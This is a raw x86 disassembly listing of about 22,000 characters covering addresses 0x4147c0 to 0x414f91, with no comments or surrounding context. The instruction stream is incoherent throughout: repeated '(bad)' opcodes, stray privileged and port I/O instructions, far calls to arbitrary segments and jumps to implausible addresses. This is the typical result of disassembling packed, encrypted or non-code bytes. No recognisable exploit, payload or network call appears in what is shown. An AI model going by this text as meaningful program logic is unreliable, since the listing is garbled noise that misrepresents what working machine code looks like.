  4147c0:	jns    0x4147df
  4147c2:	and    DWORD PTR [ecx+ebp*2],eax
  4147c5:	je     0x414809
  4147c7:	ret    
  4147c8:	jp     0x41482f
  4147ca:	mov    al,ds:0xf117e4e4
  4147cf:	pop    ecx
  4147d0:	outs   dx,DWORD PTR ds:[esi]
  4147d1:	test   al,0xea
  4147d3:	mov    dl,0xf7
  4147d5:	push   0x18
  4147d7:	popf   
  4147d8:	sub    dl,ch
  4147da:	test   al,0x5e
  4147dc:	mov    BYTE PTR [ebp+ebx*8-0xe],bh
  4147e0:	dec    ebp
  4147e1:	add    esp,DWORD PTR [eax]
  4147e3:	pop    esi
  4147e4:	aas    
  4147e5:	mov    al,ds:0xea97793d
  4147ea:	and    eax,0x2c3f2341
  4147ef:	loopne 0x4147d0
  4147f1:	into   
  4147f2:	(bad)  
  4147f4:	popa   
  4147f5:	aam    0x66
  4147f7:	aam    0x7b
  4147f9:	sbb    eax,0x8d17319f
  4147fe:	cmp    eax,0xd44c136f
  414803:	scas   eax,DWORD PTR es:[di]
  414805:	dec    ebp
  414806:	adc    cl,cl
  414808:	xor    DWORD PTR [ebx],0x79950eb7
  41480e:	xchg   edx,eax
  41480f:	mov    WORD PTR fs:[eax-0xb],?
  414813:	adc    eax,0x837d8e9d
  414818:	std    
  414819:	pop    es
  41481a:	in     al,0xd
  41481c:	fsub   st(4),st
  41481e:	jns    0x414830
  414820:	iret   
  414821:	xchg   ecx,eax
  414822:	popa   
  414823:	test   eax,0xddc2f45e
  414828:	pusha  
  414829:	ret    0x3c27
  41482c:	xchg   edx,eax
  41482d:	adc    al,0x83
  41482f:	imul   ecx,DWORD PTR [ebx],0xb8e1c857
  414835:	cmp    eax,0x13c0551d
  41483a:	or     BYTE PTR [edx+0x5efc1335],0xec
  414841:	lahf   
  414842:	sub    al,0xf3
  414844:	jmp    0x4148c3
  414846:	in     eax,dx
  414847:	mov    ah,0x46
  414849:	sar    DWORD PTR [ebp-0x3912c9f2],0x98
  414850:	into   
  414851:	cld    
  414852:	dec    edi
  414853:	mov    al,ds:0xe2db34ca
  414858:	sub    BYTE PTR [ebp+0x7],ah
  41485b:	ds fcmove st,st(5)
  41485e:	jp     0x4148d1
  414860:	sub    BYTE PTR [edi],0x97
  414863:	or     ebp,edi
  414865:	(bad)  
  414866:	mov    edi,0x4b617ff3
  41486b:	jne    0x41488c
  41486d:	cmc    
  41486e:	xchg   esp,eax
  41486f:	mov    ecx,0x469b5cde
  414874:	call   FWORD PTR [ecx-0x10]
  414877:	rcl    ch,cl
  414879:	xchg   ebx,eax
  41487a:	jle    0x414897
  41487c:	and    eax,0x4eff2467
  414881:	xchg   esp,eax
  414882:	(bad)  [ebx+eax*2-0x6af93f39]
  414889:	es (bad) 
  41488b:	xor    esp,edi
  41488d:	(bad)  
  41488e:	aad    0x42
  414890:	fwait
  414891:	jae    0x4148c6
  414893:	(bad)  
  414894:	dec    ebx
  414895:	loopne 0x41489e
  414897:	outs   dx,BYTE PTR ds:[esi]
  414898:	sbb    BYTE PTR [eax],al
  41489a:	out    dx,al
  41489b:	mov    ebp,DWORD PTR [bx+si+0x31]
  41489f:	push   edi
  4148a0:	push   ecx
  4148a1:	fld    TBYTE PTR [edi]
  4148a3:	and    ah,BYTE PTR [ebx+0x34]
  4148a6:	cli    
  4148a7:	push   cs
  4148a8:	repz sub bl,0xa5
  4148ac:	push   eax
  4148ad:	push   ebp
  4148ae:	jle    0x414880
  4148b0:	test   al,0x68
  4148b2:	cmp    DWORD PTR [esi-0x32],ebp
  4148b5:	sbb    BYTE PTR [ebx],dh
  4148b7:	sbb    dl,0xd5
  4148ba:	adc    eax,0x333e9783
  4148bf:	adc    bl,BYTE PTR [ebp-0x565f498a]
  4148c5:	jns    0x4148f7
  4148c7:	hlt    
  4148c8:	pushf  
  4148c9:	pop    edi
  4148ca:	mov    ds:0x780c9eb8,al
  4148cf:	aas    
  4148d0:	mov    eax,0x2fb716e0
  4148d5:	mov    edi,0x79134fd5
  4148da:	inc    esi
  4148db:	push   esi
  4148dc:	clc    
  4148dd:	adc    eax,0x8e539d0a
  4148e2:	xchg   ecx,eax
  4148e3:	pop    ds
  4148e4:	call   0xf1eadccd
  4148e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148ea:	dec    ebx
  4148eb:	xor    cl,0xa4
  4148ee:	cli    
  4148ef:	pop    ss
  4148f0:	and    DWORD PTR [ebp+0x4376c4fa],esp
  4148f6:	jns    0x414931
  4148f8:	mov    ch,BYTE PTR [esi+0x47b51bd7]
  4148fe:	pusha  
  4148ff:	push   0xffffff84
  414901:	push   ebp
  414902:	sbb    eax,0x4ccc740c
  414907:	popa   
  414908:	retf   
  414909:	jbe    0x4148d3
  41490b:	aas    
  41490c:	sbb    DWORD PTR [ecx-0x286ab60b],eax
  414912:	pop    ss
  414913:	std    
  414914:	dec    ebx
  414915:	out    dx,al
  414916:	xchg   edx,eax
  414917:	xor    al,0xff
  414919:	dec    esp
  41491a:	push   edi
  41491b:	rol    BYTE PTR [edx-0x50],cl
  41491e:	cmp    al,0x93
  414920:	or     bh,0xbb
  414923:	retf   
  414924:	xchg   esp,eax
  414925:	mov    dl,0xf2
  414927:	fwait
  414928:	xlat   BYTE PTR ds:[ebx]
  414929:	adc    al,0xd9
  41492b:	es ja  0x414978
  41492e:	call   0xdf662246
  414933:	mov    esp,0xf81307e
  414938:	mov    ds:0xccb5013f,al
  41493d:	mov    bh,0xfe
  41493f:	retf   0xacc0
  414942:	push   edx
  414943:	enter  0xf9aa,0x84
  414947:	mov    esp,0x67b9e329
  41494c:	adc    al,BYTE PTR [edx+0x43]
  41494f:	mov    ecx,eax
  414951:	xchg   ecx,eax
  414952:	loope  0x4149a3
  414954:	sbb    eax,0x54426a4c
  414959:	inc    DWORD PTR cs:[ecx+edx*2]
  41495d:	add    ch,BYTE PTR [ebp-0x4c]
  414960:	push   ebx
  414961:	ins    DWORD PTR es:[edi],dx
  414962:	test   DWORD PTR cs:[edx-0x3ef7868d],0x28d2ddc1
  41496d:	pop    ebx
  41496e:	mov    ebx,edx
  414970:	xchg   esi,eax
  414971:	rol    BYTE PTR [edi],0x44
  414974:	(bad)  
  414975:	sub    dh,BYTE PTR [edx-0x4fcb0421]
  41497b:	cmp    al,0xe9
  41497d:	and    dl,BYTE PTR [ecx+0x8b5f4e5]
  414983:	sub    DWORD PTR [eax+0x3f],esi
  414986:	cmp    eax,0x8494c22b
  41498b:	icebp  
  41498c:	scas   al,BYTE PTR es:[edi]
  41498d:	leave  
  41498e:	sbb    BYTE PTR [ebx],bl
  414990:	sub    ch,BYTE PTR [eax+0x6d878ec7]
  414996:	mul    BYTE PTR [ebx]
  414998:	sub    al,0xb1
  41499a:	mov    WORD PTR [edi],cs
  41499c:	xchg   ebx,eax
  41499d:	push   eax
  41499e:	pop    DWORD PTR [esi+eiz*2]
  4149a1:	add    DWORD PTR [ecx],0xe835e731
  4149a7:	lods   al,BYTE PTR ds:[esi]
  4149a8:	popf   
  4149a9:	dec    edx
  4149aa:	xlat   BYTE PTR ds:[ebx]
  4149ab:	(bad)  
  4149ac:	lahf   
  4149ad:	leave  
  4149ae:	xchg   edi,eax
  4149af:	and    DWORD PTR [edx+0x6b],0x6786d28e
  4149b6:	lods   eax,DWORD PTR ds:[esi]
  4149b7:	sbb    al,BYTE PTR [esi+ebp*4+0x644a3c63]
  4149be:	xlat   BYTE PTR ds:[ebx]
  4149bf:	test   al,0x0
  4149c1:	shr    DWORD PTR [eax+0x4346437f],0x2d
  4149c8:	repnz mov ebx,0x252937ac
  4149ce:	out    dx,eax
  4149cf:	in     al,0xb4
  4149d1:	inc    edi
  4149d2:	iret   
  4149d3:	dec    edx
  4149d4:	ja     0x4149fc
  4149d6:	xlat   BYTE PTR ds:[ebx]
  4149d7:	fs dec esp
  4149d9:	xchg   edx,eax
  4149da:	cmp    dl,cl
  4149dc:	push   ss
  4149dd:	and    eax,0x482b862a
  4149e2:	enter  0x48c2,0x5b
  4149e6:	xchg   edi,eax
  4149e7:	mov    esp,0x9f53b99c
  4149ec:	and    eax,ebp
  4149ee:	scas   al,BYTE PTR es:[edi]
  4149ef:	xchg   ebx,eax
  4149f0:	adc    DWORD PTR [edx+0x4e],ecx
  4149f3:	xor    al,0xdb
  4149f5:	leave  
  4149f6:	push   ecx
  4149f7:	adc    BYTE PTR [edx+0x8],al
  4149fa:	push   ebp
  4149fb:	xor    esi,edx
  4149fd:	mov    cl,0x79
  4149ff:	gs pop esp
  414a01:	pushf  
  414a02:	mov    WORD PTR [esi+0xb],fs
  414a05:	test   eax,0xf5c30876
  414a0a:	pop    ss
  414a0b:	inc    ecx
  414a0c:	nop
  414a0d:	xor    al,0x51
  414a0f:	mov    bh,0x4b
  414a11:	je     0x4149cf
  414a13:	xor    ah,BYTE PTR [edx-0x4a8feb62]
  414a19:	xor    edi,DWORD PTR [ecx+esi*4+0x55]
  414a1d:	push   0xf136b54b
  414a22:	pop    eax
  414a23:	shl    DWORD PTR [ecx+0x73667f17],1
  414a29:	push   edx
  414a2a:	in     eax,0x30
  414a2c:	xchg   eax,esi
  414a2e:	xor    edi,edi
  414a30:	adc    eax,0x7f8451d0
  414a35:	dec    esi
  414a36:	adc    ch,BYTE PTR [esi-0x66]
  414a39:	sti    
  414a3a:	mov    dh,0x1a
  414a3c:	sbb    bh,BYTE PTR [eax+ecx*2+0xb50745]
  414a43:	js     0x4149da
  414a45:	pop    ss
  414a46:	or     ch,BYTE PTR [ebx+eax*1]
  414a49:	vhaddpd ymm0,ymm2,YMMWORD PTR [ebp+0x17871b62]
  414a51:	fiadd  DWORD PTR [ebx+ecx*4+0x3daa18f8]
  414a58:	lods   eax,DWORD PTR ds:[esi]
  414a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a5a:	xchg   DWORD PTR [edx-0x5e40e967],esp
  414a60:	jle    0x414ad4
  414a62:	repnz stos BYTE PTR es:[edi],al
  414a64:	and    eax,0xe3dcc872
  414a69:	mov    cl,dh
  414a6b:	cmp    DWORD PTR [edi+0x7c23a85e],esi
  414a71:	add    al,0xc3
  414a73:	in     eax,0x75
  414a75:	test   DWORD PTR cs:[ecx-0x5cf044a5],eax
  414a7c:	arpl   WORD PTR [esi+0x3ddb9cb1],bp
  414a82:	mov    WORD PTR [ebx],es
  414a84:	ds jnp 0x414ac8
  414a87:	mul    BYTE PTR [edi]
  414a89:	and    eax,0x6b5edfe
  414a8e:	pop    esp
  414a8f:	fcom   DWORD PTR [ebp-0x622d35e0]
  414a95:	les    ebp,FWORD PTR [edi-0x28]
  414a98:	ret    
  414a99:	in     eax,0xea
  414a9b:	les    ebp,FWORD PTR [ecx-0x54]
  414a9e:	test   BYTE PTR [esi-0x60af098b],bl
  414aa4:	pushw  ds
  414aa6:	mov    esi,0xc422b457
  414aab:	jg     0x414abd
  414aad:	pop    esp
  414aae:	xchg   edx,eax
  414aaf:	mov    eax,0x13718f04
  414ab4:	fwait
  414ab5:	bound  edx,QWORD PTR [ebx+0x7c]
  414ab8:	leave  
  414ab9:	lods   eax,DWORD PTR ds:[esi]
  414aba:	js     0x414a82
  414abc:	adc    al,0x6
  414abe:	mov    ebx,0x4c223511
  414ac3:	xlat   BYTE PTR ds:[ebx]
  414ac4:	mov    eax,ds:0x6a020901
  414ac9:	sub    esi,edx
  414acb:	(bad)  
  414acc:	std    
  414acd:	stos   DWORD PTR es:[edi],eax
  414ace:	xchg   DWORD PTR [ebx+0x44],edi
  414ad1:	xchg   DWORD PTR [eax],edx
  414ad3:	lock outs dx,BYTE PTR ds:[esi]
  414ad5:	push   esi
  414ad6:	mov    bh,0x3e
  414ad8:	pusha  
  414ad9:	dec    esi
  414ada:	cwde   
  414adb:	test   BYTE PTR [esi],0xde
  414ade:	imul   edi,DWORD PTR [ecx-0x4b2f21a5],0x6adfd91f
  414ae8:	cwde   
  414ae9:	fimul  WORD PTR [ecx]
  414aeb:	xor    BYTE PTR [edi],bh
  414aed:	outs   dx,BYTE PTR ds:[esi]
  414aee:	scas   eax,DWORD PTR es:[edi]
  414aef:	jae    0x414a8f
  414af1:	fistp  DWORD PTR ds:0x6c9fe2e8
  414af7:	in     eax,0xfa
  414af9:	ror    BYTE PTR [edi+0x6],0xaf
  414afd:	repnz ss icebp 
  414b00:	jmp    DWORD PTR ds:0x794a3ce0
  414b06:	inc    ebx
  414b07:	xchg   esi,eax
  414b08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b09:	xchg   ebp,eax
  414b0a:	rol    BYTE PTR [ebx+0x5b],cl
  414b0d:	mov    WORD PTR [ecx-0x29bdb2da],fs
  414b13:	not    DWORD PTR [esi-0x67]
  414b16:	push   0xffffffe8
  414b18:	scas   al,BYTE PTR es:[edi]
  414b19:	pop    ds
  414b1a:	xor    al,0x64
  414b1c:	sbb    BYTE PTR [ecx-0x37],dh
  414b1f:	(bad)
  414b22:	ds pop ss
  414b24:	push   eax
  414b25:	adc    al,0x53
  414b27:	inc    DWORD PTR [esi+0x35c8bcb6]
  414b2d:	fs popa 
  414b2f:	dec    esi
  414b30:	in     al,dx
  414b31:	add    BYTE PTR [ebp-0x6b62f0e2],bl
  414b37:	mov    esp,0xab0dec45
  414b3c:	fdiv   QWORD PTR [edx+0x6f]
  414b3f:	imul   ecx,DWORD PTR [edx+ebp*1+0x5e40a04c],0x31e8b00
  414b4a:	lahf   
  414b4b:	imul   al
  414b4d:	or     DWORD PTR [esp+esi*2+0x22585eac],ebx
  414b54:	in     al,dx
  414b55:	xchg   ebx,eax
  414b56:	jne    0x414bb2
  414b58:	push   edi
  414b59:	stc    
  414b5a:	loopne 0x414b61
  414b5c:	dec    edi
  414b5d:	mov    WORD PTR [ebp-0x4c],gs
  414b60:	in     al,0x6b
  414b62:	fnstcw WORD PTR [edi]
  414b64:	js     0x414b46
  414b66:	int3   
  414b67:	rol    bl,0x3e
  414b6a:	xchg   edi,eax
  414b6b:	fld    st(2)
  414b6d:	lods   eax,DWORD PTR ds:[esi]
  414b6e:	fwait
  414b6f:	arpl   di,bp
  414b71:	stos   BYTE PTR es:[edi],al
  414b72:	push   es
  414b73:	inc    esi
  414b74:	pop    edx
  414b75:	sbb    BYTE PTR [ebp+ecx*4+0x478923ab],dh
  414b7c:	fnsave [edi-0x6b]
  414b7f:	xchg   BYTE PTR [ebp+0x3c],bh
  414b82:	cli    
  414b83:	xor    ecx,DWORD PTR [esp+ecx*1-0x7f1ad356]
  414b8a:	(bad)  
  414b8b:	retf   
  414b8c:	xor    DWORD PTR ds:0xbffde72e,ebx
  414b92:	dec    ebx
  414b93:	aaa    
  414b94:	inc    BYTE PTR [ebp-0x1e]
  414b97:	sbb    BYTE PTR [edx],bh
  414b99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b9a:	sub    esi,DWORD PTR [ebx+0x20]
  414b9d:	pop    ecx
  414b9e:	sbb    DWORD PTR [ebx+0x391b7a7d],ebx
  414ba4:	mov    cl,0x7
  414ba6:	leave  
  414ba7:	loopne 0x414c14
  414ba9:	mov    ch,0x8f
  414bab:	inc    esi
  414bac:	data16 ja 0x414b61
  414baf:	in     eax,0x2a
  414bb1:	xchg   DWORD PTR [eax-0x228f66ba],esi
  414bb7:	push   ecx
  414bb8:	les    eax,FWORD PTR [edx]
  414bba:	les    esp,FWORD PTR [ebx-0x1c0b4ab1]
  414bc0:	call   0xb576:0xfe71dac0
  414bc7:	mov    eax,0xd3c99c8d
  414bcc:	pop    es
  414bcd:	push   ebp
  414bce:	arpl   WORD PTR [ecx-0x4e3b3a0a],cx
  414bd4:	in     eax,0x88
  414bd6:	shr    DWORD PTR [edx-0x27],1
  414bd9:	leave  
  414bda:	or     eax,ebp
  414bdc:	dec    edx
  414bdd:	sar    esi,1
  414bdf:	mov    ds:0x661df3f3,eax
  414be4:	(bad)  
  414be5:	icebp  
  414be6:	sbb    eax,0x2f0652b4
  414beb:	mov    edi,0x364880fa
  414bf0:	ss adc al,0x39
  414bf3:	xchg   esi,eax
  414bf4:	scas   eax,DWORD PTR es:[edi]
  414bf5:	dec    eax
  414bf6:	psrld  mm6,QWORD PTR [ebp+0x34]
  414bfa:	dec    eax
  414bfb:	and    edi,DWORD PTR [ebx]
  414bfd:	js     0x414bf7
  414bff:	inc    ebp
  414c00:	push   0x28479aab
  414c05:	in     al,dx
  414c06:	ja     0x414c57
  414c08:	mov    bl,0x8b
  414c0a:	pop    ss
  414c0b:	js     0x414c2a
  414c0d:	mov    ds:0x45f0bb0b,eax
  414c12:	pop    esp
  414c13:	into   
  414c14:	inc    esp
  414c15:	add    bl,al
  414c17:	and    BYTE PTR [eax+0x1f],0x6d
  414c1b:	int3   
  414c1c:	dec    esi
  414c1d:	add    eax,0xffffffce
  414c20:	in     al,0xd4
  414c22:	in     al,dx
  414c23:	rcr    BYTE PTR [eax+ecx*8],1
  414c26:	push   edx
  414c27:	push   eax
  414c28:	mov    edx,0x1e8f3a6b
  414c2d:	cmp    eax,0xbb288cb0
  414c32:	xchg   ecx,eax
  414c33:	int3   
  414c34:	loopne 0x414c7a
  414c36:	lahf   
  414c37:	push   esi
  414c38:	rcr    edx,cl
  414c3a:	stos   DWORD PTR es:[edi],eax
  414c3b:	jp     0x414c3c
  414c3d:	jge    0x414bc7
  414c3f:	sbb    al,0x72
  414c41:	or     al,BYTE PTR es:[edi+0x2f03448a]
  414c48:	fadd   QWORD PTR [edx+0x76]
  414c4b:	adc    cl,bl
  414c4d:	lea    esp,[ecx+ebp*1]
  414c50:	or     esp,DWORD PTR [ecx]
  414c52:	and    BYTE PTR [ecx+0x2bf81f5],cl
  414c58:	adc    eax,DWORD PTR [edx-0x11df5b13]
  414c5e:	push   ecx
  414c5f:	loope  0x414ccf
  414c61:	xchg   edx,eax
  414c62:	jns    0x414c03
  414c64:	fmul   st,st(1)
  414c66:	dec    eax
  414c67:	loopne 0x414c5c
  414c69:	mov    eax,ds:0xf765c729
  414c6e:	rcl    BYTE PTR [ebx-0x2dc062b3],0x13
  414c75:	adc    BYTE PTR [edi],cl
  414c77:	mov    edx,0x3a45f6d3
  414c7c:	push   esp
  414c7d:	outs   dx,BYTE PTR ds:[esi]
  414c7e:	test   eax,0x87c112d1
  414c83:	mov    ebx,eax
  414c85:	rcl    eax,cl
  414c87:	cmp    eax,0xef2410ac
  414c8c:	rol    DWORD PTR [edi+0x70],1
  414c8f:	gs arpl si,ax
  414c92:	repnz shr DWORD PTR [ebx-0x4cdf2616],cl
  414c99:	adc    al,0x48
  414c9b:	inc    ebp
  414c9c:	fsub   DWORD PTR ds:0x60ca4604
  414ca2:	jno    0x414d11
  414ca4:	adc    dh,BYTE PTR [ebx+esi*4]
  414ca7:	add    al,0x48
  414ca9:	mov    ebx,0xd5aaedd4
  414cae:	mov    eax,0x2ebc7739
  414cb3:	loop   0x414ca2
  414cb5:	jbe    0xf4476e43
  414cbb:	mov    al,0x7
  414cbd:	pop    esi
  414cbe:	test   al,0x3
  414cc0:	outs   dx,BYTE PTR ds:[esi]
  414cc1:	fbstp  TBYTE PTR [edi+ebp*8+0x1b]
  414cc5:	test   DWORD PTR [ecx+0x627f67ee],edx
  414ccb:	dec    edi
  414ccc:	xor    eax,0xf7a37b7f
  414cd1:	pop    ebp
  414cd2:	mov    ebx,0x6758d1d4
  414cd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd8:	xchg   esi,eax
  414cd9:	cli    
  414cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cdb:	outs   dx,BYTE PTR ds:[esi]
  414cdc:	sbb    dh,al
  414cde:	into   
  414cdf:	scas   eax,DWORD PTR es:[edi]
  414ce0:	fmul   DWORD PTR [edi-0x7085ddf5]
  414ce6:	mov    esi,0x3a7dfe53
  414ceb:	adc    BYTE PTR ds:0xe49038bf,bh
  414cf1:	fbld   TBYTE PTR [ecx+0x38]
  414cf4:	in     eax,dx
  414cf5:	bound  ebx,QWORD PTR [eax]
  414cf7:	and    ecx,DWORD PTR [edx]
  414cf9:	sub    eax,0x2ba5c262
  414cfe:	inc    edx
  414cff:	call   0x835a:0x3fc7e463
  414d06:	sub    BYTE PTR [edx+0x35c465e0],ah
  414d0c:	das    
  414d0d:	sbb    DWORD PTR [eax+0x35af8ee2],eax
  414d13:	add    eax,0x8cab3d6f
  414d18:	mov    al,ds:0x4d4ac08e
  414d1d:	mov    es:0x73d7a906,eax
  414d23:	xchg   ebx,eax
  414d24:	xchg   ebp,eax
  414d25:	ins    DWORD PTR es:[edi],dx
  414d26:	sbb    BYTE PTR [esi],bl
  414d28:	mov    al,0x96
  414d2a:	mov    bl,0x72
  414d2c:	repnz dec esi
  414d2e:	xchg   BYTE PTR [edi-0x3e4c650],ch
  414d34:	lods   al,BYTE PTR ds:[esi]
  414d35:	mov    ds:0xcd44bc06,al
  414d3a:	jae    0x414d07
  414d3c:	xor    eax,0x5868e722
  414d41:	sub    eax,0xf6481211
  414d46:	bound  edx,QWORD PTR [edx-0x13d9232]
  414d4c:	arpl   bx,bx
  414d4e:	hlt    
  414d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d50:	rcl    cl,cl
  414d52:	add    DWORD PTR [ebp-0x213b47ab],esi
  414d58:	add    esi,ebx
  414d5a:	dec    ebx
  414d5b:	loop   0x414ddc
  414d5d:	data16 or al,0xc5
  414d60:	add    eax,0xf28068d1
  414d65:	mov    dl,0xba
  414d67:	inc    edx
  414d68:	ins    DWORD PTR es:[edi],dx
  414d69:	fisub  DWORD PTR [edi+edx*2+0x24]
  414d6d:	test   al,0x24
  414d6f:	pop    ebx
  414d70:	int    0xa1
  414d72:	jecxz  0x414d53
  414d74:	repz std 
  414d76:	dec    esi
  414d77:	loop   0x414d9a
  414d79:	jge    0x414d9b
  414d7b:	xor    DWORD PTR [eax+0x1826c888],esp
  414d81:	sbb    al,0x74
  414d83:	dec    ebx
  414d84:	fisttp DWORD PTR [esi+0x7243f585]
  414d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d8b:	test   al,0xae
  414d8d:	daa    
  414d8e:	jno    0x414d9c
  414d90:	push   ebx
  414d91:	not    DWORD PTR [ebx-0xc711bb4]
  414d97:	mov    DWORD PTR [esi],eax
  414d99:	je     0x414d22
  414d9b:	repnz fsubr st,st(7)
  414d9e:	xchg   esp,eax
  414d9f:	sbb    eax,0xfb27597b
  414da4:	and    BYTE PTR [ecx+0x2b2f79d6],al
  414daa:	inc    ecx
  414dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dac:	ret    0x48d2
  414daf:	rol    BYTE PTR [edi+0x59],1
  414db2:	ret    0xcac7
  414db5:	bound  ebx,QWORD PTR [edi+0x23dd05c5]
  414dbb:	jo     0x414dfc
  414dbd:	and    al,ch
  414dbf:	int    0x74
  414dc1:	xchg   esi,eax
  414dc2:	jecxz  0x414dbb
  414dc4:	pop    ecx
  414dc5:	loop   0x414e02
  414dc7:	jp     0x414dab
  414dc9:	or     dh,BYTE PTR [ebx-0x29831f15]
  414dcf:	shr    BYTE PTR [ecx],cl
  414dd1:	ja     0x414dc7
  414dd3:	jnp    0x414e4b
  414dd5:	and    BYTE PTR [esi+edi*4+0x70],dl
  414dd9:	mov    ebp,0x5a497616
  414dde:	sub    BYTE PTR [eax+0x46],cl
  414de1:	mov    dl,0x4c
  414de3:	imul   edx,esp,0x87da04e5
  414de9:	std    
  414dea:	adc    esp,DWORD PTR [ebx]
  414dec:	mov    DWORD PTR [eax],edx
  414dee:	nop
  414def:	(bad)  
  414df0:	lods   al,BYTE PTR ds:[esi]
  414df1:	xor    DWORD PTR [ecx-0x6d],esp
  414df4:	lods   eax,DWORD PTR ds:[esi]
  414df5:	int3   
  414df6:	(bad)  [edi]
  414df8:	cmp    bh,BYTE PTR [esi]
  414dfa:	jb     0x414d96
  414dfc:	dec    edi
  414dfd:	(bad)  
  414dfe:	mov    ds:0x2781e495,al
  414e03:	iretw  
  414e05:	ror    DWORD PTR [ebx+0x32],cl
  414e08:	mov    cs,ebx
  414e0a:	mov    ecx,0x4871184
  414e0f:	jns    0x414dc6
  414e11:	mov    eax,0x55dc1b65
  414e16:	test   BYTE PTR [edi+0x24a52c69],al
  414e1c:	int3   
  414e1d:	push   ds
  414e1e:	mov    eax,0xb789d814
  414e23:	mov    ebx,0xe5ad264a
  414e28:	mov    dh,0xae
  414e2a:	jp     0x414ea8
  414e2c:	adc    al,0xb3
  414e2e:	add    al,0xf6
  414e30:	pop    edi
  414e31:	adc    eax,0x62f1b444
  414e36:	adc    ecx,DWORD PTR [esi]
  414e38:	mov    ebx,0xb870ba58
  414e3d:	and    eax,0xd846135c
  414e42:	(bad)  
  414e43:	adc    DWORD PTR [esp+eax*2],ebx
  414e46:	dec    eax
  414e47:	clc    
  414e48:	xchg   edi,eax
  414e49:	test   eax,edx
  414e4b:	mov    bl,0x9f
  414e4d:	mov    bl,0x5a
  414e4f:	ret    0x68be
  414e52:	jmp    0x37227074
  414e57:	aas    
  414e58:	push   ds
  414e59:	stos   DWORD PTR es:[edi],eax
  414e5a:	push   ecx
  414e5b:	(bad)  
  414e5c:	jmp    0xceeac4e3
  414e61:	sbb    edi,DWORD PTR [edi]
  414e63:	cmc    
  414e64:	hlt    
  414e65:	clc    
  414e66:	scas   al,BYTE PTR es:[edi]
  414e67:	in     eax,0x7e
  414e69:	les    esi,FWORD PTR [ecx-0x12]
  414e6c:	adc    DWORD PTR [ecx-0x7fce32d7],esi
  414e72:	fs out dx,eax
  414e74:	in     eax,0xe0
  414e76:	shr    DWORD PTR [edi+ecx*1+0x5a38abe3],0xcc
  414e7e:	repnz push edx
  414e80:	cwde   
  414e81:	jmp    DWORD PTR [edx]
  414e83:	push   edx
  414e84:	(bad)  
  414e85:	repz pop ebx
  414e87:	retf   0x78c4
  414e8a:	mov    cs,ecx
  414e8c:	sub    eax,DWORD PTR [ebx+0x13034a24]
  414e92:	xor    al,0xf2
  414e94:	sar    ebx,1
  414e96:	popa   
  414e97:	loop   0x414ec0
  414e99:	daa    
  414e9a:	stc    
  414e9b:	jo     0x414ecd
  414e9d:	repz (bad) 
  414e9f:	into   
  414ea0:	cmp    bl,BYTE PTR [edx+0x670c8397]
  414ea6:	test   DWORD PTR [eax+0x5a],0x231e0e26
  414ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414eae:	call   0xe03e:0xfd618214
  414eb5:	jg     0x414e67
  414eb7:	adc    BYTE PTR [edx-0x39],ch
  414eba:	jno    0x414e75
  414ebc:	pop    ebx
  414ebd:	das    
  414ebe:	(bad)  
  414ebf:	and    BYTE PTR [eax+0x1b],bh
  414ec2:	aaa    
  414ec3:	int    0x22
  414ec5:	ret    0x764f
  414ec8:	xchg   BYTE PTR [ecx-0x52],ch
  414ecb:	mov    ebp,0x810a84a7
  414ed0:	fwait
  414ed1:	out    dx,eax
  414ed2:	cmp    al,BYTE PTR [ecx-0x72]
  414ed5:	pop    ebx
  414ed6:	test   DWORD PTR [eax+0x5ab92160],esp
  414edc:	push   edx
  414edd:	mov    esi,0x5c1c78de
  414ee2:	xchg   esi,eax
  414ee3:	lea    ecx,[ebp-0xe880360]
  414ee9:	cdq    
  414eea:	mov    edi,DWORD PTR [ebp+0x50]
  414eed:	mov    esi,0xe31b806c
  414ef2:	dec    ebx
  414ef3:	ja     0x414f63
  414ef5:	sub    esp,esp
  414ef7:	mov    al,0xd7
  414ef9:	iret   
  414efa:	ja     0x414f7a
  414efc:	ss pop es
  414efe:	mov    esi,0xd334321f
  414f03:	jb     0x414f3f
  414f05:	popa   
  414f06:	add    DWORD PTR [esi+ebx*4],eax
  414f09:	test   BYTE PTR [eax],cl
  414f0b:	outs   dx,DWORD PTR ds:[esi]
  414f0c:	cs retf 0xdf8
  414f10:	nop
  414f11:	lea    edx,[esi-0x48]
  414f14:	daa    
  414f15:	xor    eax,0x59d05a81
  414f1a:	lahf   
  414f1b:	pop    esp
  414f1c:	cmp    bl,BYTE PTR [ecx-0x66]
  414f1f:	repz mov esp,0x5351ee9b
  414f25:	jl     0x414ead
  414f27:	outs   dx,DWORD PTR ds:[esi]
  414f28:	mov    cl,0x59
  414f2a:	push   ss
  414f2b:	add    al,0x31
  414f2d:	add    BYTE PTR [edi+ecx*2],ah
  414f30:	stos   BYTE PTR es:[edi],al
  414f31:	add    al,0x4
  414f33:	(bad)  
  414f34:	cmp    edx,DWORD PTR [esi-0x49]
  414f37:	test   eax,0x4ef5a626
  414f3c:	pop    ds
  414f3d:	mov    ebx,0x80e42ce6
  414f42:	(bad)  
  414f43:	call   0xf371:0x7eb09096
  414f4a:	jne    0x414ee4
  414f4c:	mov    ch,0xfb
  414f4e:	mov    ds:0x1b438689,eax
  414f53:	out    0xf4,eax
  414f55:	fimul  WORD PTR [eax-0x2e]
  414f58:	mov    al,ds:0x3e89b86b
  414f5d:	mov    dh,cl
  414f5f:	dec    edx
  414f60:	(bad)  
  414f61:	sbb    DWORD PTR [ebp+0x37],edi
  414f64:	ss fdivp st(2),st
  414f67:	mov    dh,cl
  414f69:	inc    esp
  414f6a:	sub    ch,dl
  414f6c:	icebp  
  414f6d:	bound  esi,QWORD PTR [edx-0x27a2d706]
  414f73:	lock and ch,0xf9
  414f77:	xor    eax,0x4c3b6c
  414f7c:	xor    al,0xdd
  414f7e:	dec    bh
  414f80:	in     eax,0xeb
  414f82:	mov    ah,0x64
  414f84:	mov    eax,0xf010d30c
  414f89:	stc    
  414f8a:	retf   
  414f8b:	sti    
  414f8c:	cdq    
  414f8d:	or     esi,eax
  414f8f:	int    0xc7
  414f91:	in     al,0x8
